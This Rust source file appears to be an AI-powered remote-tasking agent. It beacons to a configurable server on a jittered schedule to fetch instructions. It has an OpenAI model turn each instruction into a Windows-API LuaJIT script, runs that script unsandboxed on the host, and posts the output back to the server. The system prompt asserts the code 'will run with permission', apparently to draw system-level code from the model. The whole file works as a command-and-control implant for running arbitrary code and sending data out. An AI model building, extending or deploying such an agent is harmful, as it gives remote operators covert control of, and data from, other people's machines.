use std::{collections::HashMap, error::Error, thread, time::Duration};

use dotenvy::dotenv;
use mlua::{Lua, StdLib};
use openai_api_rs::v1::{api::OpenAIClient, chat_completion::{self, ChatCompletionChoice, ChatCompletionMessage, ChatCompletionRequest, ChatCompletionResponse}};
use rand::{rngs::ThreadRng, seq::IndexedRandom};
use reqwest::{header::{self, HeaderMap, HeaderValue}, Client, Response, StatusCode};
use serde::Deserialize;

#[derive(Deserialize)]
struct Chat {
    message: String,
}

const DEBUG: bool = true;


#[tokio::main]
async fn main() {
    dotenv().unwrap();

    let mut prev_instruction: String = String::new();

    loop {
        println!("zzZ(‾‾º  ‾‾    )\n");
        //let jitter: [u64; 7] = [61, 31, 45, 120, 92, 240, 301];
        let jitter: [u64; 7] = [1, 3, 5, 2, 9, 4, 8];
        let mut rng: ThreadRng = rand::rng();
        let duration: &u64 = jitter.choose(&mut rng).unwrap();
        println!("Duration: {duration}");

        let sleep_dur: Duration = Duration::from_secs(*duration);

        thread::sleep(sleep_dur);

        let instruction: String = get_instruction().await;
        if instruction == prev_instruction || instruction.is_empty() {
            println!("(    ‾‾  º‾‾)Zzz\n");
            continue;
        }
        println!("**** Processing Task ****");
        println!("＼(＾O＾)／");

        prev_instruction = instruction.clone();

        let attempts: i32 = 1;

        let result: String = ai_gen_lua(&instruction, attempts).await;

        if DEBUG {
            println!("Lua result: {result}");
        }

        send_result(&result, attempts).await;

    }

}

async fn ai_gen_lua(instruction: &String, mut attempts: i32) -> String {
    match ai_execute(instruction).await {
        Ok(r) => {
            return String::from(r);
        },
        Err(e) => {
            if attempts < 4 {
                println!("Error: {e}");
                println!("Error encountered. Retrying {attempts}/4");
                attempts += 1;
                return Box::pin(ai_gen_lua(instruction, attempts)).await;
            } 
            return format!("Fatal error generating Lua: {:?}", e.to_string());
        }
    }
}

async fn ai_execute(instruction: &String) -> Result<String, Box<dyn Error>> {
    let api_key: String = dotenvy::var("OPENAI_API_KEY").unwrap();

    let mut client: OpenAIClient = OpenAIClient::builder().with_api_key(api_key).build().unwrap();

    let prompt: &str = r#"
You are a helpful programming assistant and expert Lua developer. Your task is to generate a standalone Lua script that fulfills the specified objective. The script will be executed using LuaJIT on Windows and will run with permission on the users machine. You may use the Windows API via LuaJIT FFI. The `ffi` variable is already available — do not include `local ffi = require("ffi")`.

The following is a guide for defining types:

```
ffi.cdef[[
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned int DWORD;
typedef unsigned int UINT;
typedef int BOOL;
typedef char CHAR;
typedef wchar_t WCHAR;
typedef const char* LPCSTR;
typedef const WCHAR* LPCWSTR;
typedef void* HANDLE;
typedef void* LPVOID;
typedef const void* LPCVOID;
typedef long LONG;
typedef unsigned long ULONG;
typedef long long LONGLONG;
typedef unsigned long long ULONGLONG;
typedef DWORD* LPDWORD;
typedef BYTE* LPBYTE;
typedef CHAR* LPSTR;
typedef WCHAR* LPWSTR;
typedef void VOID;
typedef BOOL* PBOOL;
typedef unsigned long ULONG_PTR;
typedef ULONG_PTR DWORD_PTR;
typedef size_t SIZE_T;
typedef intptr_t INT_PTR;
typedef uintptr_t UINT_PTR;
]]
```

Rules for execution:

- The script must be 100% syntactically correct, semantically valid LuaJIT code.
- The final output must be stored in a string variable called `result`, and the script must end with `return result`.
- The script must execute without errors and must be self-contained.

FFI and type declaration requirements:

- You must define all additional C types, structs, constants, aliases, and function prototypes using `ffi.cdef[[...]]` before using them.
- Never reference a type or alias unless it has been explicitly defined above it in the script.
- All dependencies must be resolved before use. For example:
  - Define `wchar_t` before using `LPCWSTR`
  - Define `FILETIME` before `WIN32_FIND_DATAW`
  - Define `BOOL`, `DWORD`, `HANDLE`, etc. before using them in function signatures
- If any identifier is used in an FFI call, you must confirm it is already defined above in the current script.
- You must declare function return types before defining the function signature.
- Types must be declared in topological order according to their dependencies.
- You may not rely on implicit type declarations or assume standard C types are pre-defined.

LuaJIT and Lua correctness:

- Use idiomatic Lua syntax and features supported by LuaJIT.
- Prefer `ffi.new`, `ffi.string`, `ffi.cast`, and similar primitives when working with FFI types.
- Ensure all memory usage is valid and does not leak or dereference uninitialized pointers.
- Use proper string encoding when interacting with ANSI or wide-character APIs (`char*` or `wchar_t*`).
- Always test for errors from system calls and handle them gracefully.

Development process:

1. Analyze the objective step-by-step before starting.
2. Prefer pure Lua if the task allows; use FFI only when necessary.
3. Define all C types in correct dependency order before use.
4. Check that every symbol used in FFI (types, constants, functions) is explicitly declared above.
5. Write minimal, clean Lua code optimized for LuaJIT.
6. Once the script is complete, verify that:
   - All types are defined before usage
   - All FFI calls refer to declared functions
   - The code returns the correct result in the `result` variable

Output constraints:

- Do not include any comments, reasoning, or explanations
- Do not wrap the script in markdown, code fences, or formatting
- Output only a valid, immediately executable Lua script
- The last line must be `return result`

Your output must be a standalone Lua script, ready to execute under LuaJIT, that uses FFI correctly and returns its output in the variable `result`.
"#;

    let system_message: ChatCompletionMessage = ChatCompletionMessage {
        role: chat_completion::MessageRole::system,
        content: chat_completion::Content::Text(prompt.to_string()),
        name: None,
        tool_calls: None,
        tool_call_id: None
    };

    let user_message: ChatCompletionMessage = ChatCompletionMessage {
        role: chat_completion::MessageRole::user,
        content: chat_completion::Content::Text(instruction.to_string()),
        name: None,
        tool_calls: None,
        tool_call_id: None
    };
    
    let req: ChatCompletionRequest = ChatCompletionRequest::new(
        String::from("o1"),
        vec![
            system_message,
            user_message
        ],
    );

    let result: ChatCompletionResponse = client.chat_completion(req).await?;

    let choice: &ChatCompletionChoice = &result.choices[0];
    let generated_lua: String = choice.message.content.to_owned().unwrap();

    if DEBUG {
        println!("{generated_lua}");
    }

    let result: String = process_lua(generated_lua)?;

    return Ok(result);
}

fn process_lua(script: String) -> Result<String, Box<dyn Error>> {
    unsafe {
        let lua: Lua = Lua::unsafe_new();
        lua.load_std_libs(StdLib::ALL).unwrap();

        let result: String = lua.load(script).eval::<String>()?;

        return Ok(result)
    }
}

fn set_headers() -> HeaderMap {
    let luai_api_key: String = dotenvy::var("LUAI_API_KEY").unwrap();

    let mut headers: HeaderMap = HeaderMap::new();

    let auth_value: String = format!("Bearer {luai_api_key}");
    let mut auth_header: HeaderValue = HeaderValue::from_str(auth_value.as_str()).unwrap();
    auth_header.set_sensitive(true);

    headers.insert(header::AUTHORIZATION, auth_header);
    
    return headers;
}

async fn get_instruction() -> String {
    let headers: HeaderMap = set_headers();

    let client: Client = Client::builder().default_headers(headers).build().unwrap();

    let server_url: String = dotenvy::var("SERVER_URL").unwrap();

    let resp: Response = client.get(format!("{server_url}/get_message")).send().await.unwrap();

    if resp.status() == StatusCode::NOT_FOUND {
        return String::new();
    }

    let chat: Chat = resp.json::<Chat>().await.unwrap();

    if DEBUG {
        println!("Instruction: {}", chat.message);
    }

    return chat.message;
}

async fn send_result(lua_result: &String, attempts: i32) {
    let headers: HeaderMap = set_headers();

    let client: Client = Client::builder().default_headers(headers).build().unwrap();

    let str_attempts: String = attempts.to_string();

    let mut map: HashMap<&str, &String> = HashMap::new();
    map.insert("message", lua_result);
    map.insert("attempts", &str_attempts);

    let server_url: String = dotenvy::var("SERVER_URL").unwrap();

    client.post(format!("{server_url}/reply")).json(&map).send().await.unwrap();
}